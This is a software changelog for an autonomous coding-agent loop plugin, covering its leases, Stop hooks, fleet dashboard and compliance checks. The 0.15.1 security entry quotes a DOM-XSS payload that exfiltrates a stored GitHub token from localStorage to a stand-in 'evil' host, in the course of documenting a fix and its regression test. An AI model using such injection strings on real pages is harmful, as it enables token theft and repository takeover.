# Changelog

## 0.15.1 — Security: dashboard XSS, lease race, and a Pages exposure hole

A self-audit (`/run` gap analysis) turned up three security issues in shipped code; this release fixes all three, each with the regression test whose absence let it ship. Independently reviewed (a separate correctness pass and a separate security pass) before merge.

- **Fleet dashboard DOM-XSS → GitHub PAT exfiltration (the serious one).** `bin/fleet-build.py` built control buttons with inline `onclick="…('${esc(goalId)}')"`; `esc()` escapes for HTML, but the browser HTML-decodes an attribute *before* the JS parses it, so a loop marker with `goalId: ');fetch('//evil?'+localStorage['loobster-fleet-pat'])//` on **any branch scanned within `--days`** executed arbitrary JS on the dashboard — the page that holds a `contents: read/write` fine-grained PAT in localStorage. Fixed by removing **all** inline handlers in favour of `data-*` attributes + a single delegated listener (attacker frontmatter now only ever reaches the DOM as escaped text/attributes or as a `dataset` string, never as JS), plus a `safeUrl()` allowlist (`^https?://` only) on the task PR link so a `javascript:` URL can't sneak in. New `tests/test-fleet-build.sh` guards: a static "no inline handlers" grep and a headless-Chromium test that renders a malicious marker and asserts no injected code runs (skips cleanly where no browser is present).
- **Lease takeover could crown two winners.** `bin/loop-lease.py`'s stale-lease takeover did `os.remove()` + `O_EXCL`-create; under a race, one runner's blind `os.remove()` deleted another's *fresh* lock and both returned `acquired` — two runners driving one worktree, the exact thing the lease exists to prevent. The takeover now serializes on an **`fcntl.flock`** gate, which is exclusive *and* released by the OS on crash — so, unlike a stale lock *file* (whose orphan-cleanup is itself a race), there is no timeout or self-heal to get wrong. Under the flock it re-reads the lease and either yields (already taken) or writes a fresh lock via an atomic `tmp`+`os.replace` with a per-pid tmp name (so a concurrent `refresh` can't collide). New `tests/test-loop-lease.sh` cases: 12 racers on one stale lease → exactly one winner (stress-verified 150×), a leftover-gate case, and a refresh-vs-takeover hammer that must never crash or leak a tmp. The docs' "one instance per worktree" claim was also corrected to the truth — the lock is **per marker** (two goals in one worktree lease independently).
- **The runner id wasn't unique, so a re-entry mistook the live lease for its own.** `loop.md` passed a `<runner-id>` to the lease but never said how to make it unique, so a `ScheduleWakeup`/cron re-entry tended to reuse a derivable id (the goal slug, the branch) — hitting the lease's idempotent-refresh path (`holder == runner`) and concluding the *live* run's lease was its own, so two runners drove one loop. Fixed with a `loop-lease.py newid` subcommand (host-pid-epoch-rand) that `loop.md` now generates **once per invocation**; a re-entry with a fresh id correctly sees `held by <other>` and backs off. Regression test added. Also documented the parallel-loop model: distinct goals lease independently, but run each in its **own git worktree** so the Stop-hook state and re-entry don't interfere.
- **`/team-setup` could publish a private repo's board to the world.** `bin/team-init.sh` gated Pages on *repo* visibility, but GitHub serves Pages **publicly** for every repo except a private one on GitHub Enterprise Cloud — so a private repo on Free/Pro/Team was published world-readable on the happy path, silently, exactly what the ⚠️ blocks warn against. The gate now checks visibility **and** plan, treats unknown/missing plan as public (fail-safe), and — because even an Enterprise org can serve Pages publicly by policy — makes the **live read-back authoritative**: if the published site comes back public and the human didn't pass `--public-ok`, it rolls the Pages site back (DELETE) and exits 3 rather than leaving a surprise-public board. A failed read-back is reported as "verify manually", never as a false "private". New `tests/test-team-init.sh` cases cover Enterprise-private (published private), non-Enterprise private (refused), and the served-public rollback.
- Tests: **111 passing** across 11 suites. README version/test badges corrected (were pinned at 0.13.0 / 86).

## 0.15.0 — The fleet board grows a real task board (the backlog gets the signals treatment)

The dashboard showed *that* a loop had a backlog (counts + a bar) but not *what's in it* — backlog items were Claude Code Tasks, which live in the agent's session state, off the data plane. Now the backlog itself is git-native and the board is a real, writable kanban.

- **Task files: one committed file per backlog item** at `plans/loop/<slug>-tasks/<id>-<title>.md` (frontmatter: `status: open|in_progress|done|parked`, `title`, `score`, optional `owner`/`pr`/`linearId`). File-per-item is the merge-safe lesson from signals; living under `plans/loop/**` means every edit already triggers a fleet rebuild. Titles are team-visible → **non-PHI only**, same rule as signals.
- **The loop syncs both ways** (`loop.md`): each checkpoint mirrors its Tasks → files (cap ~50 by score, prune gone ones); each cycle trigger adopts upstream edits exactly like marker `status:` — a new file becomes a scored backlog item, a status edit becomes a `TaskUpdate` (`done` → completed, `parked` → blocked, `open` → reopen). With `linearProject` set, board-added items are also filed as Linear issues — Linear stays the source of what work exists.
- **`fleet-build.py` renders a kanban per loop card** — in progress / open / parked / done columns, cards sorted by RICE — read straight out of git across branches with the same dedup rule as markers. Status moves and an **"Add task" form** commit through the existing PAT wiring (Contents API, on the loop's branch), so a teammate can file work from their phone and the loop picks it up next cycle. Every board action stays an audit-logged commit; still zero servers.
- **Token UX:** the controls dialog deep-links "Create a fine-grained PAT" with the exact two settings spelled out (Only select repositories → this repo; Contents: Read and write). GitHub has no API to create PATs, so those clicks are the irreducible manual step.
- **The dashboard got a real design pass** (screenshot-verified in both themes, desktop + mobile): tabbed views — **Board** (cross-loop kanban with per-loop color chips, loop filter chips, and the add-task form), **Loops** (fleet cards with status pills, progress bars, and a "Board (n)" cross-link that filters the kanban), **Signals** — under a sticky header with a controls-state pill. Native `<dialog>` for token setup, toast confirmations that name the branch being committed to, honest empty states that teach the next command, OKLCH light/dark palettes, keyboard focus states, `prefers-reduced-motion` support, and horizontal snap-scrolling columns on mobile. Still one self-contained HTML file, zero dependencies. New `PRODUCT.md` records the design register and principles.
- Tests: task parsing/dedup/sort + board wiring in `tests/test-fleet-build.sh`. **99 passing** across 11 suites.

## 0.14.1 — Patch: fleet board no longer counts the signals README as a signal

- **`bin/fleet-build.py` disagreed with `bin/signals-build.py` about what a signal is.** The signals builder excludes hub scaffolding (`README.md`, `INDEX.md`); the fleet builder globbed `signals/*.md` and skipped only `INDEX*` — so on every repo wired by `/team-setup` (which scaffolds `signals/README.md`), the fleet card read "1 new" forever and never showed genuinely empty. Cosmetic, not a compliance hole (the strict PHI lint never treated README as a signal), but the count was permanently off by one. The fleet builder now applies the same exclusions; regression covered in `tests/test-fleet-build.sh`. First found live on a vendored 0.14.0 copy — re-run `/team-setup` with `--force` after upgrading to refresh vendored files.

## 0.14.0 — /team-setup: team-ready in one command

0.13.0 made GitHub the team hub — but wiring a repo up was manual (copy a template, click Settings → Pages) and, worse, quietly incomplete: `fleet-pages.yml` runs `bin/fleet-build.py` and `bin/signals-build.py` from the **repo checkout inside Actions**, where the plugin install directory doesn't exist — so a hand-copied workflow failed on its first run unless you knew to vendor the scripts too.

- **New `/team-setup` + `bin/team-init.sh`** — one command wires a repo for the team layer: vendors the workflow **and** the scripts it runs (`bin/fleet-build.py`, `bin/signals-build.py`, `templates/signals-dashboard.html`), each stamped `vendored from loobster vX.Y.Z` (re-run with `--force` after a plugin upgrade to refresh); scaffolds `signals/` + `plans/loop/`; and enables Pages via `gh api` (Source: GitHub Actions) — the Settings click disappears.
- **The visibility caveat became a gate.** On a non-private repo the script *refuses* to enable Pages (exit 3) instead of relying on a ⚠️ comment; `--public-ok` is an explicit, human-confirmed override, and the slash command tells the agent to ask the human before passing it. See `compliance/org-controls-audit.md`.
- **`--protect-main`** (optional) requires one approving PR review on the default branch — pairs with `pr-lane` loops, where the PR review *is* the human gate.
- **Degrades honestly.** No `gh` / no auth / no remote → files are still vendored and the one remaining manual step is printed. Re-runs skip existing files without `--force`. Warns when a leftover `signals-pages.yml` is present (one Pages site per repo; the fleet board replaces it). `--dry-run` previews everything, writes nothing, calls nothing.
- Tests: new `tests/test-team-init.sh` (vendoring + version stamps, idempotency, public-repo refusal and `--public-ok` override via a fake `gh`, private-repo Pages + protection calls, dry-run, exit codes). **98 passing** across 11 suites.

## 0.13.0 — The fleet dashboard: the team's central thing, on GitHub, not on a server

Answers "should agents + engineers talk to a hosted hub?" with: the hub already exists — GitHub is the server. No new data path, no SaaS, no self-hosted service.

- **New `bin/fleet-build.py`** — aggregates every goal-loop across **all branches with recent activity** (pr-lane loops live on feature branches, so branch-scanning is the point) by reading `plans/loop/*.md` markers straight out of git (no checkouts), dedups markers inherited from fork points to the branch where the loop actually checkpoints, folds in the signals hub, and emits `data.json` + a self-contained `index.html`. Ages render client-side, so a stale page looks stale instead of confidently wrong. New `tests/test-fleet-build.sh`.
- **New `templates/fleet-pages.yml`** — GitHub Actions builds the board on every marker/signal push plus hourly and publishes to **GitHub Pages**: one URL for the whole team, fleet at `/`, signals board at `/signals/`. One Pages site per repo, so this workflow *replaces* `signals-pages.yml` (it serves both). Same visibility caveat as before: private Pages needs Enterprise/Team; never on a public repo with sensitive business state.
- **The dashboard is editable with zero backend.** Paste a fine-grained PAT (contents read/write, stored only in the viewer's browser) and Pause / Resume / Stop buttons commit a `status:` edit to the marker **on its branch** via the GitHub Contents API — every control action is an audit-logged commit.
- **Loops now honor upstream marker edits (remote control).** `loop.md`'s cycle trigger fetches `origin` and compares the marker's upstream `status`: a teammate (or the dashboard) setting `paused`/`done` upstream is adopted exactly as if set locally — release the lease, pause/stop. This is what makes the dashboard's buttons real controls; a colleague can stop a loop on your machine from their phone.
- Tests: **86 passing** across 10 suites.

## 0.12.1 — Patch: ship the loop.md claims fix to installed plugins

- Version bump so the plugin installer (which is version-gated) picks up the README-cleanup PR's `loop.md` correction: the escalation summary said "never auto-pushes", which contradicted the `pr-lane` delivery mode authorized elsewhere in the same file — now "never lands anything on the default branch without a human." Doc-truth fix only; no behavior change.

## 0.12.0 — Interview once, then don't stop: goal intake, Linear-backed backlog, resolve-before-escalate

Three upgrades aimed at one outcome: after a single upfront clarification, the loop should not need you again unless something genuinely requires a human.

- **Goal intake (Setup step 0).** `/loop` now asks ONE round of clarifying questions at kickoff — scope, definition of done, constraints, and **delivery mode** — records the answers in the marker, and never interviews you again. `--no-intake` (or a headless kickoff) skips it. Previously the loop wrote its own success criteria for ambiguous goals and burned cycles on its own interpretation.
- **Delivery mode: `pr-lane` vs `interactive`.** The blocking commit/push approval was the loop's most common legitimate stop. Granting **`pr-lane`** at intake converts it to an async gate: the loop commits to a feature branch, pushes, opens a PR (**never the default branch**), links it on the Linear issue, and keeps working the next item — the PR review *is* the human approval. `interactive` (default when intake didn't run) keeps the classic stop. AGENTS.md rule 6 updated to say this honestly: a human still approves every landing; nothing ever reaches the default branch without one.
- **Resolve-before-escalate ladder.** A would-be stop now climbs: bounded act loop (cap 3) → **fresh resolver subagent** — clean context, `resolver` model from `.claude/loobster.json` (else a different model than act), explicitly told to try a *different approach*, cap 2, independently verified → **park the item and continue** the backlog (blocked Task + Linear comment + signal) → human. The human rung remains only for: a **sensitive Secure FAIL that survived the resolver** (compliance is never laddered away), an all-parked backlog, an interactive commit gate, or a budget spike. Wired into `loop.md`, `run.md` (Phase 6: cap 3 → resolver 2 → escalate, total bound 5), and AGENTS.md rule 5.
- **Linear-backed backlog (`--linear <project>`).** Linear becomes the backlog's source of truth: seed from the project's open issues (RICE-scored locally, `metadata.linearId` linkage), re-sync each cycle (externally closed/reassigned issues drop out — Linear wins), picked issues → **In Progress**, `pr-lane` completions → **In Review** with the PR linked, direct completions → **Done**, blocked items get a comment stating exactly what's needed, and newly discovered work is filed as real issues. Falls back to local Tasks (with a notice) when the MCP is absent.
- **Status board** shows the new state: delivery mode, Linear project, and a parked-items count (`backlogBlocked`), in both the terminal view and `status.html`.
- New `resolver` role in `reference/loobster.example.json`.

## 0.11.0 — Loops that actually keep looping (durability audit) + status board + external driver + subagent routing

A focused pass on "why does the loop keep stopping?". Four root causes found and fixed:

**Loop durability (the fixes)**
- **The Stop hook was one-nudge-only.** `loop-rearm.py` allowed any stop with `stop_hook_active` set, so a model that stopped twice in a row killed the loop until the next cron (≥20 min away — or forever if none was armed). It now **re-blocks repeatedly, bounded by a progress counter** (`plans/loop/.rearm-state.json`): the counter resets whenever the marker's `cycle`/heartbeat advances or a fresh stop chain starts, and after `LOOBSTER_LOOP_REARM_MAX` (default 5, kept under Claude Code's own 8-block cap) consecutive no-progress nudges it fails open. A working loop gets re-armed indefinitely; a wedged one still can't trap the session.
- **The runner lease went stale mid-cycle.** Lease TTL was 900s but a single act step (a full `/run` in a subagent) can run 30–60 min silent — so a live runner looked dead, a cron re-entry "took over", and the two instances collided (or the original stopped in confusion on a failed refresh). `DEFAULT_TTL` is now **3600s** (sized to the longest realistic cycle), and `loop.md` specifies the lost-lease protocol: a refresh that exits 3 means *you* were taken over → stop quietly, never keep writing to a worktree another runner owns.
- **`paused` was a one-way door.** Every human approval gate set `status: paused` — and nothing ever set it back, so a loop's first gate was its funeral. `loop.md` now makes re-activation load-bearing: when the human answers a gate, apply the decision, **flip the marker back to `active`, re-arm, and continue in the same turn**; unattended re-entries still treat `paused` as a strict no-op.
- **Codex/Cursor had zero durability.** New **`bin/loobster-drive.sh`** — an external driver that re-invokes `claude -p` / `codex exec` / `cursor-agent -p` (or any CLI via `LOOBSTER_DRIVE_CMD`) while the marker is `active`, sleeps `--interval`, caps at `--max`, stops on `paused` **without invoking** (gates sacred) and on `done`. Deliberately does not inject permission-bypass flags. New `tests/test-loobster-drive.sh`.

**Visibility**
- **New cross-tool status board:** `bin/loop-status.py` (terminal) and `bin/loop-status.py build` → **`plans/loop/status.html`** — one self-contained, auto-refreshing page (status pill, cycle, runner-lease freshness, backlog bar, last outcome) built purely from the durable marker + lock files, so it's identical under Claude Code, Codex, Cursor, or the driver. The loop regenerates it at every checkpoint and now mirrors backlog counts (`backlogOpen/InProgress/Done`, `lastOutcome`) into the marker frontmatter so the board doesn't depend on any agent's task API. New `tests/test-loop-status.sh`. (Judgement call: a local generated page beats a chat-UI artifact — an artifact is vendor-locked to one chat surface and can't report on a loop running in another tool.)

**Subagent routing**
- **Preferred subagents:** optional `.claude/loobster.json` (`subagents.research/act/verify → {model}`) routes each delegation role to a model — e.g. Opus for act, something cheaper for mechanical research, and a **different** model for verify so never-self-verify gains capability-independence (a cross-model judge doesn't share the builder's blind spots). Wired into `run.md` + `loop.md`; example at `reference/loobster.example.json`.

**Honesty**
- Documented that Option D's compression depends on `hookSpecificOutput.updatedToolOutput`, supported in **Claude Code ≥ 2.1.120** (verified against the hooks docs) — on older versions the hook is a silent no-op, so update to actually get the savings.

**Review hardening (independent code-review pass on this release)**
- `loobster-drive.sh`: the `LOOBSTER_DRIVE_CMD` custom path now passes the prompt as an exported env var (`"$LOOBSTER_PROMPT"`), never spliced into `sh -c` — a goal containing quotes/`;` can no longer break or inject into the command; a value-taking flag with no value errors out instead of spinning the parse loop.
- `loop-status.py`: tolerates free-form backlog counts (no more build-killing ValueError), and anchors at the nearest ancestor with `plans/loop/` (same walk-up as the Stop hook) so a subdirectory cwd can't silently stale the board.
- `loop-rearm.py`: the nudge budget in `.rearm-state.json` is keyed by `session_id`, so two sessions on one worktree can't reset or pre-spend each other's counter; also anchors marker discovery at the project root from a subdirectory cwd.
- Subagent model routing wired into `secure.md`, `review-code.md`, and `research-codebase.md` too (not just run/loop) — the README's "every phase command" claim is now true.
- Tests: **80 passing** across 9 suites (was 45).

## 0.10.0 — Option D works with zero install (built-in lite-crush tier)

- **Token compression now works out of the box — no `pip install` required.** Option D gained a **Tier 2** fallback: `bin/lite_crush.py`, a small, pure-stdlib, deterministic crusher (lossless whole-document JSON minify; marked collapse of repeated/blank lines; clamped over-long lines). It runs whenever headroom (Tier 1) isn't importable, so the hook is **no longer a silent no-op without headroom**. Wins are biggest on logs/JSON/repetitive output (~50–95%) and near-zero on prose/source (passthrough), where Tier 1's real compressors help more. Lossy edits are marked `[loobster-crush: …]` so the model never sees silent truncation. `LOOBSTER_LITE_CRUSH=0` disables only Tier 2; `LOOBSTER_HEADROOM=0` still disables everything.
- **Fixed the headroom return-type bug 0.9.4 missed.** Real `headroom.compress()` returns a `CompressResult` **object** (`.messages`, `.tokens_saved`, `.compression_ratio`); the previous adapter only handled `str`/`dict`/`list`, so it fell through to passthrough **even with headroom installed**. The test mock returned a bare list (a shape the real API never returns), so CI stayed green over a dead path. `bin/headroom-compress.py` now reads `result.messages`, and `tests/test-headroom-hook.sh` exercises a real `CompressResult`-shaped mock plus the new lite-crush tiers. New `tests/test-lite-crush.sh`.
- **Why not embed headroom itself?** Its compressors are a compiled Rust extension (`headroom._core`, built with maturin) behind a tiktoken + pydantic framework — there is no pure-Python subset to vendor, so the real mechanics genuinely require the install. lite-crush is independent loobster code inspired by the same idea, not a port. **Compliance note:** because the hook is on by default and now always compresses, a **first-party** crusher reads tool outputs (possible PHI) on every matching call even without headroom — `compliance/org-controls-audit.md` updated; set `LOOBSTER_HEADROOM=0` on PHI repos until reviewed.

## 0.9.4 — Audit fixes: honest claims, a real lease, and a tracker compliance check

A self-audit pass that closes the gaps between what the docs promised and what shipped.

**Correctness / safety**
- **Real CI.** Added `.github/workflows/` — `ci.yml` (runs the test suite + the `build-codex-skills.py --check` drift gate + `py_compile`), `codeql.yml` (backs the security badge), and `pages.yml` (publishes `docs/` to GitHub Pages, the advertised URL). There was previously no `.github/` at all.
- **Loop durability survives a closed session.** `loop.md` now arms `CronCreate(..., durable: true)` (the default is in-memory and dies on session close) and passes the required `reason` to `ScheduleWakeup`.
- **The single-runner lease is a real mutex.** New `bin/loop-lease.py` claims an atomic lock file (`O_CREAT|O_EXCL`), replacing the cooperative frontmatter convention; `loop.md` uses acquire/refresh/release. New `tests/test-loop-lease.sh`.
- **`loop-rearm.py` fails OPEN** on a frontmatter-less marker (it was scanning the whole body, so a stray `status: active` prose line could wedge the session).
- **`signals-build.py` no longer pollutes the cwd** when there's no `signals/` dir; added `--help`; PHI-flagged signals are now **quarantined** from the build by default (`--allow-flagged` to include), with broader PHI recall (named patients, record numbers); fixed a parser bug that ate the first bullet of list-led bodies.

**Compliance**
- **New: third-party tracker check** — `bin/scan-trackers.py` flags Google Ads/Analytics/GTM, Meta Pixel, Hotjar, etc. in the frontend. `/secure` treats a tracker on a PHI page as a HIPAA **FAIL** without a BAA (HHS OCR online-tracking-technologies guidance); SOC 2 = consent/disclosure WARN. Added to the HIPAA checklist (§164.312(e)). New `tests/test-scan-trackers.sh`.
- All four checklists now define the **SKIPPED** status + marker grammar they always advertised.

**headroom (Option D)**
- Fixed the integration to call headroom's real `compress(messages, model=...)` API (it was passing a bare string → a silent no-op even when installed) and to handle its return shapes; corrected the package (`pip install "headroom-ai[code]"`) and repo link (`headroomlabs-ai/headroom`); corrected the "no network" note (ML compressors may fetch a model unless `HF_HUB_OFFLINE=1`).

**Docs / packaging**
- Reference docs (`backlog-scoring`, `token-discipline`) moved out of `commands/` into `reference/` so they no longer register as slash commands — the count is now genuinely **eleven**; cross-refs and the Codex skill generator updated.
- `screenshot.mjs` handles `--help` and a missing Playwright install without an opaque crash, and validates flag values.
- Fixed the docs deploy story (GitHub Pages primary; dead `cd site` → `cd docs`); softened the signals PHI "enforcement" wording to "best-effort lint"; removed dead `board-build.py`; `loobster.sh` / INDEX / naming polish.
- AGENTS.md gained the `--auto`/`--manual`/`--autonomous` flag semantics, the autonomous-mode invariant, and the loop durability/lease story.
- Tests: **45 passing** across 6 suites (was 25).

## 0.9.3 — Single-runner lease (concurrency-safe self-driving)

- **Only one loop instance runs per worktree.** The marker now carries a `runner` + `runnerHeartbeatAt` lease, refreshed each cycle. On (re)entry, a loop checks the lease first: if a live runner holds it, the re-entry (a `ScheduleWakeup`/cron firing while an in-session run is active, or a parallel headless run on a shared worktree) **backs off and exits** instead of running a concurrent cycle and colliding on git/files. Only a stale/empty lease is taken over.
- This makes `CronCreate` safe to arm on shared worktrees (no more hand-skipping it to dodge contention). Wakeup fallback delay bumped to 1200s (cache-aware). `/loobster:loop status` now reports the runner lease.
- Cleared on exit alongside `status: done`.

## 0.9.2 — Visible loop schedule + `status` query (ask loobster)

- The loop **prints the re-entry schedule it armed** on kickoff — cron expression, human-readable cadence, job id, 7-day expiry, and how to cancel — the same way the `/loop` skill confirms its schedule. No more guessing whether self-driving is on.
- New **`/loobster:loop status`** (or just ask "what's the loop doing / what's scheduled?") reports each active/paused loop's schedule (via `CronList` + the marker's `reentry` id), backlog counts, readiness (Stop hook / permission mode / headroom), and how to stop — without running a cycle.
- Replaces a separate readiness script with "ask loobster". (Reminder: run `/reload-plugins` after `/plugin update` so the new loop.md actually loads.)

## 0.9.1 — Self-driving loops (no wrapper needed)

- `/loobster:loop <goal>` now **arms its own durable re-entry** — a `ScheduleWakeup` (in-session) plus an optional `CronCreate` (closed-session) that re-invoke the command itself. You no longer wrap it in the `/loop` scheduler; the single command survives a dead turn and resumes from its checkpoint. The driver is recorded in the marker (`reentry: <id>`) and cancelled on exit/escalation.
- Re-entry respects the marker `status`: a fired wakeup on a `paused` (approval-gate) or `done` loop is a **no-op**, so self-driving never auto-drives past a human gate. Added a `status: paused -> allow` test to the Stop-hook suite (25 total).

## 0.9.0 — Self-healing loops (crash-safe, no milestone pauses)

- **A dead turn no longer kills a goal-loop.** Each in-progress task is heartbeated (`metadata.startedAt`/`heartbeatAt`) and every cycle checkpoints to `plans/loop/<slug>.md`. On re-entry the loop **reclaims any stale `in_progress` task** (interrupted, not running), checks what already landed, and continues idempotently — fixing the "M19 stranded in_progress after a connection drop" case. `/resume` is now goal-loop-aware and continues the loop rather than treating it as a one-shot.
- **The loop runs to a real exit condition, never a milestone.** `loop.md` now enumerates the ONLY valid stops (goal met / backlog empty / maxCycles / budget / escalation) and explicitly bans voluntary pauses ("clean milestone", "done a lot", "say keep going") — the behavior that made a loop hold and ask to continue.
- **New Stop hook** `bin/loop-rearm.py` (in `hooks/hooks.json`): while a loop is `status: active`, it refuses a premature stop and tells the model to resume. Honors `stop_hook_active` (no infinite loops), fails open, kill switch `LOOBSTER_LOOP_REARM=0`. For hard crashes (API connection drop) the durable driver is still the reliable re-entry path.
- New `tests/test-loop-rearm.sh` (block-only-when-active, infinite-loop guard, kill switch, fail-open). Tests 24/24 across 4 suites. Bump 0.9.0.

## 0.8.0 — Codex support + "loop engineering" positioning

- **Runs in Codex now** (and any `AGENTS.md` / `.agents/skills` agent), not just Claude Code. New `AGENTS.md` (methodology + non-negotiable rules, under Codex's 32 KiB cap) + `.agents/skills/<cmd>/SKILL.md` for every command, **generated** from the canonical `commands/*.md` by `bin/build-codex-skills.py` (single source of truth; `--check` flags drift). headroom on Codex = Option C proxy/middleware (Codex has no PostToolUse hook).
- **Reframed around "loop engineering"** — a new "Why loop engineering" section (README + docs) positions Loobster as the harness that makes an autonomous loop safe to run, on the RePPIT (Mihail Eric) + headroom (Tejas Chopra) foundations. New "Use with Codex" section + docs quickstart.
- New `tests/test-codex-skills.sh` (sync, frontmatter, no leaked tokens, AGENTS.md size). Bump to 0.8.0.

## 0.7.0 — headroom on by default

- **Token compression is no longer opt-in** — the headroom `PostToolUse` hook (Option D) is **enabled by default**. It compresses large read-heavy tool outputs whenever a local headroom install is importable, and is a **no-op when headroom isn't installed**. Disable with `LOOBSTER_HEADROOM=0`.
- **PHI guardrail:** because it's now on by default, on PHI repos set `LOOBSTER_HEADROOM=0` until headroom has had a data-path review. `compliance/org-controls-audit.md` updated (status: ON by default). Tests now verify default-on + the kill switch.
- README signals diagram label tightened so it doesn't collide with GitHub's diagram controls.

## 0.6.0 — Configurable compliance frameworks (health is one aspect) + clearer README

- **Frameworks are now enable/disable** per repo via `.claude/loobster-frameworks.json` (`{ "frameworks": ["soc2","iso27001"] }`); `/secure` runs only the enabled ones, defaulting to all four when no config is present. Healthcare (HIPAA/HITRUST) is positioned as **one profile**, not a requirement. See `compliance/frameworks.md`.
- **New ISO/IEC 27001:2022 checklist** (`compliance/iso27001-checklist.md`) — Annex A controls relevant to a code diff (secure development, cryptography, access control, logging/masking, vulnerability/config management) + built-in fallback checks in `/secure`.
- `secure.md` is now framework-agnostic: reads the enabled set, runs one section per enabled framework, and the report lists which frameworks ran.
- **README rewritten for clarity/visibility** — an "At a glance" capability table surfaces adaptive gating, autonomous mode, the goal-loop, the signals hub, configurable compliance, and token discipline up front; repositioned from "healthcare software" to a secure autonomous dev workflow where healthcare is one aspect.
- Supported frameworks: **HIPAA · HITRUST · ISO 27001 · SOC 2**. Sample config at `compliance/loobster-frameworks.example.json`.
- Bump to 0.6.0; add `iso27001` / `frameworks` keywords. (Repo/plugin rename to a general name is tracked as a follow-up — a GitHub repo rename preserves stars + sets up redirects; the plugin `name` is unchanged here to avoid breaking existing installs.)
- **Never self-verify (new core rule):** every verification/review/judgment step (Test, Secure, frontend verify, the loop's verify) MUST run in a **separate verifier subagent** that did not produce the work. Wired into `run.md`, `review-code.md`, `secure.md`, `loop.md`, `verify-frontend.md`.
- **Verifiable frontend layer:** new `/verify-frontend` — when a change touches the UI, capture Playwright screenshots (`bin/screenshot.mjs`, blocks on 4xx/5xx or console errors) and attach them to the PR **GitHub-native, no other accounts** (Actions artifacts via `templates/playwright-verify.yml` + a native PR comment; or committed-to-branch images embedded via raw URLs). Wired into the Test phase.
- **Loobster** 🦞 — loop + lobster mascot. Animated red ASCII via `bin/loobster.sh`; static version in the README.
- **Rebranded to Loobster** — new ASCII "LoOBSTER" logo (lowercase-o motif), repo moving to `github.com/NilsWidal/loobster` (a GitHub transfer preserves the 23 stars + redirects), plugin/marketplace names → `loobster` / `nilswidal-loobster`, category → developer-tools. Plugin author still credits Cara.
- **Docs site** — a team-focused static docs site in `site/` (Vercel-deployable for a shared URL); see `site/DEPLOY.md`.

## 0.5.0 — Signals hub (team coordination) + dynamic dashboard

- **New `/signals` — a shared central hub** for multi-person teams on one codebase: any loop/agent/teammate **emits** observations (friction/opportunity/fact) to a committed `signals/<date>-<author>-<slug>.md` store, and any loop **consumes** the relevant ones. File-per-signal = merge-safe for multiple writers; `author` gives attribution; cross-author dedup; lifecycle `new→ack→acted→archived`.
- **Loop integration** — `/loop` now consumes relevant signals in its Trigger step and emits signals in Review & learn; a consumed signal can spawn a RICE-scored backlog task.
- **Dynamic team dashboard** — `bin/signals-build.py` regenerates `signals/{data.js,data.json,INDEX.md}` from the signal files; `templates/signals-dashboard.html` renders a live status board (group by status/author/loop/type, auto-refresh, works from `file://` and when served). Tests in `tests/test-signals-build.sh`.
- **Optional GitHub Pages** — `templates/signals-pages.yml` publishes the dashboard to a shared team URL on each push. **Private repo / non-PHI only.**
- **Compliance** — the load-bearing rule is **no PHI in shared signals** (committed + shared); `/secure` enforces it (`signals-build.py --strict`), and `compliance/org-controls-audit.md` adds a signals + Pages data-path control.
- Bump to 0.5.0; add `signals`/`team` keywords; `/signals` added to the command list.

## 0.4.2 — Loop permission prompts: docs + safer subagent defaults

- **Documented the real cause of mid-loop permission prompts:** subagents do **not** inherit a session's runtime `--dangerously-skip-permissions`; they resolve mode from settings, and `defaultMode: "auto"` makes the classifier evaluate each subagent's tool calls — so you get write prompts even when the main session shows bypass. Fix: set `permissions.defaultMode: "bypassPermissions"` (a launch flag alone isn't enough for subagents) plus a `deny` guardrail list.
- **`/loop`:** new "Permissions" section; the act step no longer forces `isolation: "worktree"` (worktrees write to untrusted paths and trigger prompts under non-bypass modes) — worktree isolation is now reserved for genuine parallelism under bypass.
- **`/run` Phase 4:** added the same permission caveat to the parallel/worktree sub-issue guidance.

## 0.4.1 — Rename to /loop + make the loop concretely runnable

- **Renamed the dedicated loop command to `/loop`**. Invoke it namespaced: **`/loobster:loop <goal>`** (the bare `/loop` only resolves if aliased as a project command).
- **Made the command executable, not advisory:** it now spells out the concrete tool calls (`TaskCreate` the goal + backlog, `TaskList`→pick→`Agent`→act→`TaskUpdate`, re-score) and **runs cycles back-to-back in-session** — it no longer stops after one item. Added a clear "How to run it (so it actually loops)" section, including wrapping with `/loop` or a scheduled agent for unattended/persistent runs.
- Goal record + learnings now persist under `plans/loop/<slug>.md`; backlog stays in Claude Code Tasks.

## 0.4.0 — Goal-loop mode (dedicated loops & goals + optimizable backlog)

- **New `/loop <goal>` command:** a continuous goal-loop — Trigger (next backlog item) → Investigate & Act (runs `/run` in an isolated subagent) → Backlog gen/assign → Review & learn → ↺ — until the goal is met, the cycle cap is hit, or budget is exhausted. Wraps RePPITS as its "act" step; never bypasses gates/Secure; never auto-pushes; resumable from the backlog.
- **Optimizable backlog = Claude Code Tasks + metadata.** New `commands/backlog-scoring.md` defines a **model-set RICE** score (`(reach × impact × confidence) / effort`) stored in each Task's `metadata`; the loop works the highest-scored open item and re-scores each cycle. `/make-plan` tags sub-tasks with the `goalId` + RICE when run under a goal.
- **Goal = free text, model-judged** (met / partial / not-met against free-text success criteria).
- **Token economics for loops:** per-cycle subagent isolation + artifact-compacted backlog/learnings (always on), a per-cycle budget guard, and a **hard recommendation to enable Option D headroom AST compression** (`LOOBSTER_HEADROOM=1`) — a loop's repeated code reads are headroom's `CodeCompressor` (AST) sweet spot.
- README: new "Goal-loop mode" section with a rendered Mermaid loop diagram.

## 0.3.2 — Autonomous mode spans the full loop (4→6)

- **Fix:** autonomous mode now drives the whole **Implement → Test → Secure** loop (Phases 4–6), not just Phase 4. Previously it halted at Gate 5 ("Proceed to security check?"), so the loop only ran within implementation.
- Autonomous mode now **auto-advances the Implement (Gate 4) and Test (Gate 5) review prompts** for every tier; the Test and Secure phases still **run and block on findings**, and the **final commit/push approval always stops** (never auto-pushes).
- Clarified that the per-tier `--auto` policy and **autonomous mode** are orthogonal mechanisms, and removed the contradictory "autonomous still stops at Gate 5" wording across Arguments, Gate 3, Gate 4/5/6, and Rules. WARN items are now carried to the final approval rather than interrupting the loop.

## 0.3.1 — Autonomous kickoff & docs

- **Explicit autonomous kickoff at Gate 3:** after the plan is approved you now choose **(a) run autonomously**, **(b) step through each sub-issue**, or **(c) make changes**. "Run autonomously" is what hands control to the workflow to drive Implement → Test → Secure on its own — resolving the previously underspecified hand-off after planning.
- **Defined autonomous mode precisely** and fixed a contradiction: in autonomous mode the per-sub-issue Gate 4 is skipped (workflow commits and continues), the bounded loop (cap 3) still escalates on failure, and Gate 5/6 still stop — sensitive tier never skips Test/Secure.
